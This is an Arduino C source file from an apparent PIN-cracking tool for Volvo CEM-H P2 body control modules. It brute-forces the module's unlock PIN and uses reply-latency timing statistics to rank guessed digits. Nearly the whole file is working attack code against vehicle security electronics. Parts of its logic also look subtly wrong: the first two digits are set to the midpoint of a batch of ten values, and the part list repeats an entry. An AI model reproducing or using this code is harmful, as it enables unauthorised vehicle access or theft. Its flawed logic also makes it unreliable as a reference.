/* SPDX-License-Identifier: GPL-3.0 */
/*
 * CEM-H P2 specific optimizations
 */

#include "cem_cracker_optimized.h"
#include <Arduino.h>
#include <math.h>

// CEM-H P2 part numbers database
static const uint32_t CEM_H_P2_PARTS[] = {
    30786476, 30728539, 30682982, 30728357, 30765148,
    30765643, 30786476, 30786890, 30795115, 31282455,
    31394157, 30786579
};

// Check if given part number is CEM-H P2
bool is_cem_h_p2(uint32_t part_number) {
    const int num_parts = sizeof(CEM_H_P2_PARTS) / sizeof(uint32_t);
    for (int i = 0; i < num_parts; i++) {
        if (CEM_H_P2_PARTS[i] == part_number) {
            return true;
        }
    }
    return false;
}

// Optimize parameters specifically for CEM-H P2
void optimize_cem_h_parameters(void) {
    // Adjust timing parameters
    cem_reply_min = (uint32_t)(cem_reply_avg * CEM_H_REPLY_MIN_FACTOR);
    cem_reply_max = (uint32_t)(cem_reply_avg * CEM_H_REPLY_MAX_FACTOR);
    
    // Set shuffle order for CEM-H P2 (3,1,5,0,2,4)
    shuffle_order[0] = 3;
    shuffle_order[1] = 1;
    shuffle_order[2] = 5;
    shuffle_order[3] = 0;
    shuffle_order[4] = 2;
    shuffle_order[5] = 4;
}

// Calculate confidence score for PIN attempt
double calculate_confidence_score(const pin_statistics *stats) {
    if (stats->valid_samples < MIN_VALID_SAMPLES) {
        return 0.0;
    }
    
    // Calculate confidence based on latency distribution
    double normalized_latency = stats->mean_latency / (double)cem_reply_avg;
    double latency_score = 1.0 - (normalized_latency - CEM_H_REPLY_MIN_FACTOR) / 
                          (CEM_H_REPLY_MAX_FACTOR - CEM_H_REPLY_MIN_FACTOR);
    
    // Weight by sample consistency
    double consistency = 1.0 - (stats->std_deviation / stats->mean_latency);
    
    return latency_score * consistency * 
           (stats->valid_samples / (double)MAX_SAMPLES_FIRST_POSITION);
}

// Process a batch of PIN attempts
void process_pin_batch(pin_batch *batch, uint8_t *pin, uint32_t pos) {
    pin_statistics *stats = &batch->stats;
    stats->total_latency = 0;
    stats->valid_samples = 0;
    
    for (uint8_t val = batch->start_value; val <= batch->end_value; val++) {
        pin[pos] = binToBcd(val);
        
        uint32_t latency;
        bool success = cemUnlock(pin, NULL, &latency, false);
        
        if (success) {
            // Potential match found
            stats->mean_latency = latency;
            stats->std_deviation = 0;
            stats->confidence_score = 1.0;
            batch->processed = true;
            return;
        }
        
        // Update statistics if latency is within valid range
        if (latency >= cem_reply_min && latency <= cem_reply_max) {
            stats->total_latency += latency;
            stats->valid_samples++;
            
            // Update running statistics
            double old_mean = stats->mean_latency;
            stats->mean_latency = stats->total_latency / (double)stats->valid_samples;
            
            // Simplified rolling standard deviation
            if (stats->valid_samples > 1) {
                stats->std_deviation = (stats->std_deviation * (stats->valid_samples - 1) + 
                                     fabs(latency - old_mean)) / stats->valid_samples;
            }
        }
        
        // Check for early termination
        if (should_terminate_early(stats)) {
            batch->processed = true;
            return;
        }
    }
    
    // Calculate final confidence score
    stats->confidence_score = calculate_confidence_score(stats);
    batch->processed = true;
}

// Determine if we can terminate batch processing early
bool should_terminate_early(const pin_statistics *stats) {
    // Terminate if we have enough samples and confidence is very low
    if (stats->valid_samples >= QUICK_REJECT_THRESHOLD && 
        calculate_confidence_score(stats) < 0.2) {
        return true;
    }
    
    // Terminate if we have high confidence
    if (stats->valid_samples >= MIN_VALID_SAMPLES && 
        calculate_confidence_score(stats) > CONFIDENCE_THRESHOLD) {
        return true;
    }
    
    return false;
}

// Main PIN cracking function for CEM-H P2
bool crack_cem_h_p2_pin(uint8_t *pin) {
    optimize_cem_h_parameters();
    
    // Process first two positions with high sampling
    for (uint32_t pos = 0; pos < 2; pos++) {
        pin_batch batches[10];  // Process in batches of 10 values
        
        // Initialize batches
        for (int i = 0; i < 10; i++) {
            batches[i].start_value = i * 10;
            batches[i].end_value = min(99, (i + 1) * 10 - 1);
            batches[i].processed = false;
            memset(&batches[i].stats, 0, sizeof(pin_statistics));
        }
        
        // Process all batches
        for (int i = 0; i < 10; i++) {
            process_pin_batch(&batches[i], pin, pos);
            if (abortReq) return false;
            
            // Update display
            lcd_spinner();
            lcd_printf(0, 1, "Pos %lu: %d%%", pos, (i + 1) * 10);
        }
        
        // Find batch with highest confidence
        double max_confidence = 0;
        int best_batch = 0;
        
        for (int i = 0; i < 10; i++) {
            if (batches[i].stats.confidence_score > max_confidence) {
                max_confidence = batches[i].stats.confidence_score;
                best_batch = i;
            }
        }
        
        // Set PIN digit from best batch
        pin[pos] = binToBcd((batches[best_batch].start_value + 
                            batches[best_batch].end_value) / 2);
                            
        lcd_printf(0, 0, "PIN[%lu]=%02X", pos, pin[pos]);
    }
    
    // Remaining positions use brute force with early termination
    for (uint32_t pos = 2; pos < PIN_LEN; pos++) {
        for (uint8_t val = 0; val < 100; val++) {
            if (abortReq) return false;
            
            pin[pos] = binToBcd(val);
            uint32_t latency;
            
            if (cemUnlock(pin, NULL, &latency, false)) {
                lcd_printf(0, 0, "PIN[%lu]=%02X", pos, pin[pos]);
                return true;
            }
            
            if ((val % 10) == 0) {
                lcd_printf(0, 1, "Pos %lu: %d%%", pos, val);
                lcd_spinner();
            }
        }
    }
    
    return false;
}
